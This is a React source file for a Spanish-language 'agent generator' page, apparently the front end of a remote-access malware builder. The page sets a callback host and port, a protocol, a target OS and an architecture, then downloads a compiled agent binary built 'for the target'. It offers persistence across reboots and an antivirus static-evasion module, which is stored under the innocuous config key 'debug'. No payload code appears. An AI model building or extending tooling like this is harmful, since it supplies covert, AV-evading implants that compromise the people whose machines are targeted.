import React, { useState } from "react";
import {
  Download,
  Loader2,
  CheckCircle,
  AlertCircle,
  Server,
  Monitor,
  Network,
  Shield,
  Terminal,
  ChevronDown,
  ChevronUp,
  Copy,
  RefreshCw,
  Zap,
  Globe,
  Cpu,
} from "lucide-react";

// ─── Paleta ───────────────────────────────────────────────────────────────────
const BG = "#0d1117";
const CARD = "#161b22";
const BORDER = "#21262d";
const BORDER_ACTIVE = "#388bfd";

// ─── Sub-componentes ──────────────────────────────────────────────────────────

function SectionTitle({ icon: Icon, label, color = "#58a6ff" }) {
  return (
    <div className="flex items-center gap-2 mb-4">
      <Icon size={14} style={{ color }} />
      <span className="text-xs font-semibold uppercase tracking-widest" style={{ color }}>
        {label}
      </span>
    </div>
  );
}

function OptionCard({ selected, onClick, children }) {
  return (
    <button
      onClick={onClick}
      className="w-full text-left px-4 py-3 rounded-lg border transition-all duration-150 font-mono text-sm"
      style={{
        background: selected ? "rgba(56,139,253,0.1)" : "rgba(30,38,51,0.6)",
        borderColor: selected ? BORDER_ACTIVE : BORDER,
        boxShadow: selected ? "0 0 0 1px #388bfd40" : "none",
      }}
    >
      {children}
    </button>
  );
}

function Toggle({ value, onChange, label, description }) {
  return (
    <div className="flex items-center justify-between py-3 border-b" style={{ borderColor: BORDER }}>
      <div>
        <p className="text-sm font-medium" style={{ color: "#e6edf3" }}>{label}</p>
        <p className="text-xs mt-0.5" style={{ color: "#6e7681" }}>{description}</p>
      </div>
      <button
        onClick={() => onChange(!value)}
        className="relative inline-flex h-5 w-9 items-center rounded-full flex-shrink-0 ml-4 transition-colors duration-200"
        style={{ background: value ? "#238636" : "#30363d" }}
      >
        <span
          className="inline-block h-3.5 w-3.5 rounded-full bg-white transition-transform duration-200 shadow-sm"
          style={{ transform: value ? "translateX(18px)" : "translateX(2px)" }}
        />
      </button>
    </div>
  );
}

// ─── Datos ────────────────────────────────────────────────────────────────────

const OS_OPTIONS = [
  {
    value: "windows",
    label: "Windows",
    sub: ".exe",
    icon: (
      <svg viewBox="0 0 24 24" width="20" height="20" fill="#58a6ff">
        <path d="M0 3.449L9.75 2.1v9.451H0m10.949-9.602L24 0v11.549H10.949M0 12.6h9.75v9.451L0 20.699M10.949 12.6H24V24l-12.9-1.801" />
      </svg>
    ),
  },
  {
    value: "linux",
    label: "Linux",
    sub: "ELF",
    icon: (
      <svg viewBox="0 0 24 24" width="20" height="20" fill="#3fb950">
        <path d="M12.504 0c-.155 0-.315.008-.48.021C7.309.156 3.825 2.951 3.019 6.956c-.506 2.557.108 5.316 1.745 7.546C6.38 16.376 8.24 18.52 9.7 20.8c.73 1.14 1.26 2.276 1.42 3.2.16.93-.08 1.82-.5 2.5-.42.68-.96 1.16-1.5 1.36-.54.2-1.1.16-1.54-.16-.44-.32-.74-.9-.78-1.7-.04-.8.24-1.76.7-2.56.46-.8 1.08-1.48 1.7-1.9.3-.2.62-.34.94-.4.32-.06.64-.04.94.08-.3-.12-.62-.14-.94-.08-.32.06-.64.2-.94.4-.62.42-1.24 1.1-1.7 1.9-.46.8-.74 1.76-.7 2.56.04.8.34 1.38.78 1.7.44.32 1 .36 1.54.16.54-.2 1.08-.68 1.5-1.36.42-.68.66-1.57.5-2.5-.16-.93-.69-2.06-1.42-3.2-1.46-2.28-3.32-4.424-4.936-6.298C4.383 12.272 3.769 9.513 4.275 6.956 5.081 2.951 8.565.156 13.024.021c.165-.013.325-.021.48-.021z" />
      </svg>
    ),
  },
  {
    value: "darwin",
    label: "macOS",
    sub: "Mach-O",
    icon: (
      <svg viewBox="0 0 24 24" width="20" height="20" fill="#d2a8ff">
        <path d="M12.152 6.896c-.948 0-2.415-1.078-3.96-1.04-2.04.027-3.91 1.183-4.961 3.014-2.117 3.675-.546 9.103 1.519 12.09 1.013 1.454 2.208 3.09 3.792 3.039 1.52-.065 2.09-.987 3.935-.987 1.831 0 2.35.987 3.96.948 1.637-.026 2.676-1.48 3.676-2.948 1.156-1.688 1.636-3.325 1.662-3.415-.039-.013-3.182-1.221-3.22-4.857-.026-3.04 2.48-4.494 2.597-4.559-1.429-2.09-3.623-2.324-4.39-2.376-2-.156-3.675 1.09-4.61 1.09zM15.53 3.83c.843-1.012 1.4-2.427 1.245-3.83-1.207.052-2.662.805-3.532 1.818-.78.896-1.454 2.338-1.273 3.714 1.338.104 2.715-.688 3.559-1.701" />
      </svg>
    ),
  },
];

const ARCH_OPTIONS = [
  { value: "amd64", label: "x86-64", sub: "AMD64", badge: "Recomendado" },
  { value: "386", label: "x86", sub: "32-bit", badge: null },
  { value: "arm64", label: "ARM64", sub: "AArch64", badge: null },
  { value: "arm", label: "ARM", sub: "ARMv7", badge: null },
];

const MODE_OPTIONS = [
  {
    value: "ws",
    label: "WebSocket",
    description: "Conexión bidireccional en tiempo real",
    icon: <Zap size={15} style={{ color: "#3fb950" }} />,
    color: "#3fb950",
  },
  {
    value: "http",
    label: "HTTP",
    description: "Polling sobre HTTP estándar",
    icon: <Globe size={15} style={{ color: "#58a6ff" }} />,
    color: "#58a6ff",
  },
  {
    value: "tcp",
    label: "TCP Raw",
    description: "Socket TCP directo",
    icon: <Network size={15} style={{ color: "#d2a8ff" }} />,
    color: "#d2a8ff",
  },
];

// ─── Componente principal ─────────────────────────────────────────────────────

const Generar = () => {
  const [config, setConfig] = useState({
    host: "192.168.148.1",
    port: "5000",
    mode: "ws",
    os: "windows",
    arch: "amd64",
    enable_persistence: true,
    debug: true,
  });

  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const [error, setError] = useState(null);
  const [showAdvanced, setShowAdvanced] = useState(false);
  const [copied, setCopied] = useState(false);

  const set = (field, value) => {
    setConfig((prev) => ({ ...prev, [field]: value }));
    setSuccess(false);
    setError(null);
  };

  const validate = () => {
    if (!config.host.trim()) return "El host es requerido";
    const port = Number(config.port);
    if (!port || port < 1 || port > 65535) return "Puerto inválido (1-65535)";
    return null;
  };

  const handleGenerate = async () => {
    const err = validate();
    if (err) { setError(err); return; }

    setLoading(true);
    setError(null);
    setSuccess(false);

    try {
      const response = await fetch("http://localhost:5000/generar", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(config),
      });

      if (!response.ok) throw new Error(`Error ${response.status}: ${response.statusText}`);

      const contentType = response.headers.get("content-type");
      if (contentType?.includes("application/octet-stream")) {
        const blob = await response.blob();
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement("a");
        a.href = url;
        a.download = `agent_${config.os}_${config.arch}${config.os === "windows" ? ".exe" : ""}`;
        document.body.appendChild(a);
        a.click();
        window.URL.revokeObjectURL(url);
        document.body.removeChild(a);
      }
      setSuccess(true);
    } catch (err) {
      setError(err.message);
    } finally {
      setLoading(false);
    }
  };

  const copyConfig = () => {
    navigator.clipboard.writeText(JSON.stringify(config, null, 2)).catch(() => {});
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const resetConfig = () => {
    setConfig({ host: "192.168.148.1", port: "5000", mode: "ws", os: "windows", arch: "amd64", enable_persistence: true, debug: true });
    setSuccess(false);
    setError(null);
  };

  const selectedOS = OS_OPTIONS.find((o) => o.value === config.os);

  return (
    <div className="min-h-full p-6 font-sans" style={{ background: BG }}>
      <div className="max-w-5xl mx-auto">

        {/* ── Header ── */}
        <div className="mb-8 flex items-start justify-between">
          <div>
            <div className="flex items-center gap-2 mb-1">
              <Terminal size={18} style={{ color: "#58a6ff" }} />
              <h1 className="text-xl font-bold" style={{ color: "#e6edf3" }}>
                Generador de Agentes
              </h1>
            </div>
            <p className="text-sm" style={{ color: "#6e7681" }}>
              Configura y compila un agente personalizado para el objetivo
            </p>
          </div>

          <div className="flex items-center gap-2">
            <button
              onClick={copyConfig}
              className="flex items-center gap-1.5 px-3 py-1.5 rounded-md text-xs font-medium transition-colors"
              style={{ background: "#21262d", color: copied ? "#3fb950" : "#8b949e", border: `1px solid ${BORDER}` }}
              title="Copiar JSON"
            >
              <Copy size={12} />
              {copied ? "Copiado" : "Copiar config"}
            </button>
            <button
              onClick={resetConfig}
              className="flex items-center gap-1.5 px-3 py-1.5 rounded-md text-xs font-medium transition-colors hover:text-white"
              style={{ background: "#21262d", color: "#8b949e", border: `1px solid ${BORDER}` }}
              title="Restablecer"
            >
              <RefreshCw size={12} />
              Reset
            </button>
          </div>
        </div>

        {/* ── Layout de dos columnas ── */}
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">

          {/* ── Columna izquierda (configuración) ── */}
          <div className="lg:col-span-2 space-y-5">

            {/* Tarjeta: Red */}
            <div className="rounded-xl border overflow-hidden" style={{ background: CARD, borderColor: BORDER }}>
              <div className="px-5 py-4 border-b" style={{ borderColor: BORDER }}>
                <SectionTitle icon={Network} label="Configuración de Red" color="#58a6ff" />
              </div>
              <div className="px-5 py-4 grid grid-cols-2 gap-4">
                <div>
                  <label className="block text-xs font-medium mb-1.5" style={{ color: "#8b949e" }}>
                    HOST / IP
                  </label>
                  <input
                    type="text"
                    value={config.host}
                    onChange={(e) => set("host", e.target.value)}
                    className="w-full px-3 py-2.5 rounded-lg text-sm font-mono outline-none transition-all"
                    style={{
                      background: "#0d1117",
                      border: `1px solid ${BORDER}`,
                      color: "#e6edf3",
                    }}
                    onFocus={(e) => (e.target.style.borderColor = BORDER_ACTIVE)}
                    onBlur={(e) => (e.target.style.borderColor = BORDER)}
                    placeholder="192.168.1.100"
                  />
                </div>
                <div>
                  <label className="block text-xs font-medium mb-1.5" style={{ color: "#8b949e" }}>
                    PUERTO
                  </label>
                  <input
                    type="number"
                    value={config.port}
                    onChange={(e) => set("port", e.target.value)}
                    className="w-full px-3 py-2.5 rounded-lg text-sm font-mono outline-none transition-all"
                    style={{
                      background: "#0d1117",
                      border: `1px solid ${BORDER}`,
                      color: "#e6edf3",
                    }}
                    onFocus={(e) => (e.target.style.borderColor = BORDER_ACTIVE)}
                    onBlur={(e) => (e.target.style.borderColor = BORDER)}
                    placeholder="5000"
                    min="1"
                    max="65535"
                  />
                </div>
              </div>
            </div>

            {/* Tarjeta: Modo de conexión */}
            <div className="rounded-xl border overflow-hidden" style={{ background: CARD, borderColor: BORDER }}>
              <div className="px-5 py-4 border-b" style={{ borderColor: BORDER }}>
                <SectionTitle icon={Zap} label="Modo de Conexión" color="#3fb950" />
              </div>
              <div className="px-5 py-4 grid grid-cols-3 gap-3">
                {MODE_OPTIONS.map((m) => (
                  <OptionCard key={m.value} selected={config.mode === m.value} onClick={() => set("mode", m.value)}>
                    <div className="flex items-center gap-2 mb-1.5">
                      {m.icon}
                      <span
                        className="font-semibold text-sm"
                        style={{ color: config.mode === m.value ? m.color : "#c9d1d9" }}
                      >
                        {m.label}
                      </span>
                    </div>
                    <p className="text-xs leading-tight" style={{ color: "#6e7681" }}>
                      {m.description}
                    </p>
                  </OptionCard>
                ))}
              </div>
            </div>

            {/* Tarjeta: SO */}
            <div className="rounded-xl border overflow-hidden" style={{ background: CARD, borderColor: BORDER }}>
              <div className="px-5 py-4 border-b" style={{ borderColor: BORDER }}>
                <SectionTitle icon={Monitor} label="Sistema Operativo" color="#d29922" />
              </div>
              <div className="px-5 py-4 grid grid-cols-3 gap-3">
                {OS_OPTIONS.map((os) => (
                  <OptionCard key={os.value} selected={config.os === os.value} onClick={() => set("os", os.value)}>
                    <div className="flex items-center gap-2 mb-1">
                      {os.icon}
                      <span
                        className="font-semibold text-sm"
                        style={{ color: config.os === os.value ? "#e6edf3" : "#8b949e" }}
                      >
                        {os.label}
                      </span>
                    </div>
                    <span className="text-xs font-mono" style={{ color: "#6e7681" }}>
                      {os.sub}
                    </span>
                  </OptionCard>
                ))}
              </div>
            </div>

            {/* Tarjeta: Arquitectura */}
            <div className="rounded-xl border overflow-hidden" style={{ background: CARD, borderColor: BORDER }}>
              <div className="px-5 py-4 border-b" style={{ borderColor: BORDER }}>
                <SectionTitle icon={Cpu} label="Arquitectura" color="#bc8cff" />
              </div>
              <div className="px-5 py-4 grid grid-cols-2 md:grid-cols-4 gap-3">
                {ARCH_OPTIONS.map((arch) => (
                  <OptionCard key={arch.value} selected={config.arch === arch.value} onClick={() => set("arch", arch.value)}>
                    <div className="flex items-center justify-between mb-0.5">
                      <span
                        className="font-semibold text-sm"
                        style={{ color: config.arch === arch.value ? "#e6edf3" : "#8b949e" }}
                      >
                        {arch.label}
                      </span>
                      {arch.badge && (
                        <span
                          className="text-[10px] font-medium px-1.5 py-0.5 rounded"
                          style={{ background: "#1f3d2f", color: "#3fb950" }}
                        >
                          {arch.badge}
                        </span>
                      )}
                    </div>
                    <span className="text-xs font-mono" style={{ color: "#6e7681" }}>
                      {arch.sub}
                    </span>
                  </OptionCard>
                ))}
              </div>
            </div>

            {/* Tarjeta: Opciones avanzadas */}
            <div className="rounded-xl border overflow-hidden" style={{ background: CARD, borderColor: BORDER }}>
              <button
                onClick={() => setShowAdvanced((v) => !v)}
                className="w-full flex items-center justify-between px-5 py-4 text-sm font-medium transition-colors hover:bg-white/5"
                style={{ color: "#8b949e" }}
              >
                <div className="flex items-center gap-2">
                  <Shield size={14} style={{ color: "#8b949e" }} />
                  <span className="text-xs font-semibold uppercase tracking-widest">
                    Opciones Avanzadas
                  </span>
                </div>
                {showAdvanced ? <ChevronUp size={14} /> : <ChevronDown size={14} />}
              </button>

              {showAdvanced && (
                <div className="px-5 pb-4 border-t" style={{ borderColor: BORDER }}>
                  <div className="pt-2">
                    <Toggle
                      value={config.enable_persistence}
                      onChange={(v) => set("enable_persistence", v)}
                      label="Persistencia"
                      description="Mantiene el agente activo entre reinicios del sistema"
                    />
                    <Toggle
                      value={config.debug}
                      onChange={(v) => set("debug", v)}
                      label="Módulo de evasión estática"
                      description="Habilita técnicas para evadir análisis estático de AV"
                    />
                  </div>
                </div>
              )}
            </div>
          </div>

          {/* ── Columna derecha (preview + acción) ── */}
          <div className="space-y-5">

            {/* Preview JSON */}
            <div className="rounded-xl border overflow-hidden" style={{ background: CARD, borderColor: BORDER }}>
              {/* Titlebar */}
              <div className="flex items-center gap-2 px-4 py-2.5 border-b" style={{ borderColor: BORDER, background: "#161b22" }}>
                <div className="flex gap-1.5">
                  <div className="w-2.5 h-2.5 rounded-full bg-red-500/70" />
                  <div className="w-2.5 h-2.5 rounded-full bg-yellow-500/70" />
                  <div className="w-2.5 h-2.5 rounded-full bg-green-500/70" />
                </div>
                <span className="text-xs font-mono ml-1" style={{ color: "#6e7681" }}>
                  config.json
                </span>
              </div>

              <pre
                className="text-xs p-4 overflow-auto font-mono leading-relaxed"
                style={{ maxHeight: "260px", background: "#0d1117" }}
              >
                {JSON.stringify(config, null, 2).split("\n").map((line, i) => {
                  // Colorear clave vs valor
                  const keyMatch = line.match(/^(\s*)("[\w_]+")(:\s*)(.*)$/);
                  if (keyMatch) {
                    const [, indent, key, colon, val] = keyMatch;
                    const isStr = val.startsWith('"');
                    const isBool = val === "true" || val === "false";
                    const valColor = isStr ? "#a5d6ff" : isBool ? "#ff7b72" : "#f0883e";
                    return (
                      <div key={i}>
                        <span style={{ color: "#c9d1d9" }}>{indent}</span>
                        <span style={{ color: "#79c0ff" }}>{key}</span>
                        <span style={{ color: "#c9d1d9" }}>{colon}</span>
                        <span style={{ color: valColor }}>{val}</span>
                      </div>
                    );
                  }
                  return <div key={i} style={{ color: "#c9d1d9" }}>{line}</div>;
                })}
              </pre>
            </div>

            {/* Resumen del build */}
            <div className="rounded-xl border p-4 space-y-2.5" style={{ background: CARD, borderColor: BORDER }}>
              <p className="text-xs font-semibold uppercase tracking-widest mb-3" style={{ color: "#6e7681" }}>
                Resumen del Build
              </p>
              {[
                { label: "Target", value: `${selectedOS?.label} / ${config.arch}` },
                { label: "Servidor", value: `${config.host}:${config.port}` },
                { label: "Protocolo", value: config.mode.toUpperCase() },
                { label: "Persistencia", value: config.enable_persistence ? "Activada" : "Desactivada" },
                { label: "Evasión AV", value: config.debug ? "Activada" : "Desactivada" },
              ].map(({ label, value }) => (
                <div key={label} className="flex justify-between text-xs font-mono">
                  <span style={{ color: "#6e7681" }}>{label}</span>
                  <span style={{ color: "#e6edf3" }}>{value}</span>
                </div>
              ))}
            </div>

            {/* Mensaje de error */}
            {error && (
              <div
                className="flex items-start gap-2 px-4 py-3 rounded-lg border text-sm"
                style={{ background: "rgba(248,81,73,0.1)", borderColor: "#f8514940", color: "#ffa198" }}
              >
                <AlertCircle size={14} className="mt-0.5 shrink-0" />
                <span>{error}</span>
              </div>
            )}

            {/* Mensaje de éxito */}
            {success && (
              <div
                className="flex items-start gap-2 px-4 py-3 rounded-lg border text-sm"
                style={{ background: "rgba(63,185,80,0.1)", borderColor: "#3fb95040", color: "#56d364" }}
              >
                <CheckCircle size={14} className="mt-0.5 shrink-0" />
                <span>Agente generado y descargado correctamente</span>
              </div>
            )}

            {/* Botón generar */}
            <button
              onClick={handleGenerate}
              disabled={loading}
              className="w-full flex items-center justify-center gap-2 py-3.5 px-5 rounded-xl text-sm font-semibold transition-all duration-200 disabled:opacity-50 disabled:cursor-not-allowed"
              style={{
                background: loading
                  ? "#238636"
                  : "linear-gradient(135deg, #238636 0%, #196c2e 100%)",
                color: "#ffffff",
                boxShadow: loading ? "none" : "0 0 20px rgba(35,134,54,0.3)",
              }}
            >
              {loading ? (
                <>
                  <Loader2 size={16} className="animate-spin" />
                  Compilando agente...
                </>
              ) : (
                <>
                  <Download size={16} />
                  Compilar y Descargar
                </>
              )}
            </button>

            {/* Nota */}
            <p className="text-xs text-center" style={{ color: "#484f58" }}>
              El binario se descargará automáticamente al finalizar la compilación
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Generar;
